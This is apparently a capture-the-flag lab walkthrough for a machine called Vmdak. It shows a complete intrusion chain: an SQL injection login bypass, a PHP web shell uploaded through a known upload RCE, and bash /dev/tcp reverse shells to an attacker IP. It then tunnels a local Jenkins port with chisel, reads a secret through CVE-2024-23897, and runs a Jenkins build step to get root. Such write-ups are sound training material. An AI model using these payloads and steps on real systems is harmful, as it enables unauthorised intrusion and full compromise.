##### Tags: `jenkins`  `chisel`  `port-forwarding`  `passwd-reuse`  `SQL`

# 🐧Vmdak🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.215.103

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 21 ftp we got a config file
```console
$ ftp 192.168.215.103
Connected to 192.168.215.103.
220 (vsFTPd 3.0.5)
Name (192.168.215.103): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34935|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml
226 Directory send OK.
```
it has the path of the password
```console
  <InitialRootPassword>/root/.jenkins/secrets/initialAdminPassword></InitialRootPassword>
```
port 80 is Apache/2.4.58, nothing interested  
port 9443 is running Prison Management system  

also it has a login page and we can use SQL bypass password to login 
```console
admin' #
```

there is a password in the leave management page 
```console
RonnyCache001
```
search github and found it has RCE in the upload profile photo  
https://github.com/fubxx/CVE/blob/main/PrisonManagementSystemRCE.md  


upload random jpg to change profile photo and use burp suite to capture the post request  
change the payload the a cmd shell
```console
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
put our revershell payload is the file uploaded diectory
```console
https://192.168.215.103:9443/uploadImage/cmd.php?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.213%2F22+0%3E%261%27


$ nc -lvnp 22  
listening on [any] 22 ...

www-data@vmdak:/var/www/prison/uploadImage$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
see which user can login 
```console
www-data@vmdak:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
vmdak:x:1000:1000::/home/vmdak:/bin/sh
```
try the password we got from the website and login as vmdak
```console
www-data@vmdak:/$ su vmdak
su vmdak
Password: RonnyCache001
vmdak@vmdak:/$ id
uid=1000(vmdak) gid=1000(vmdak) groups=1000(vmdak)
```
## Privilege Escalation

We found port 8080 is running locally
```console
vmdak@vmdak:/$  ss -lntp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
         
LISTEN 0      50         127.0.0.1:8080       0.0.0.0:*
```
port forwarding to our local host and run the web page
```console
#Kali
$ chisel server --p 5000 --reverse
2026/02/22 22:47:05 server: Reverse tunnelling enabled
2026/02/22 22:47:05 server: Fingerprint NtyDDIraEnsBeTmU2KKgcF6hhn7bvUZKjP8icGCJOxc=
2026/02/22 22:47:05 server: Listening on http://0.0.0.0:5000
2026/02/22 22:47:39 server: session#1: tun: proxy#R:9001=>8080: Listening
```
```console
#Target Machine

vmdak@vmdak:/tmp$ ./chisel client 192.168.45.213:5000 R:9001:127.0.0.1:8080
<el client 192.168.45.213:5000 R:9001:127.0.0.1:8080
2026/02/22 11:47:38 client: Connecting to ws://192.168.45.213:5000
2026/02/22 11:47:39 client: Connected (Latency 102.059857ms)
```
then we can access the webpage 
```console
http://localhost:9001
```
It requires a password of /root/.jenkins/secrets/initialAdminPassword  
search online and found CVE-2024-23897 which allow us to read Jenkins Arbitrary File  
https://github.com/godylockz/CVE-2024-23897  
upload the python script to the target and run it
```console
vmdak@vmdak:/tmp$ python3 jenkins_fileread.py -u 127.0.0.1:8080 -f /root/.jenkins/secrets/initialAdminPassword
140ef31373034d19a77baa9c6b84a200
```
use the password to log into the http://localhost:9001  
it is a jenkins page that we can build and execute command  
```
#step

+ New Item >> name: shell >> freestyle project >> OK
Build Steps >> Execute shell >> bash -c 'bash -i >& /dev/tcp/192.168.45.213/22 0>&1'
go to shell >> Build now
```
```console
$ nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.215.103] 46842

root@vmdak:~/.jenkins/workspace/shell# id
uid=0(root) gid=0(root) groups=0(root)
```
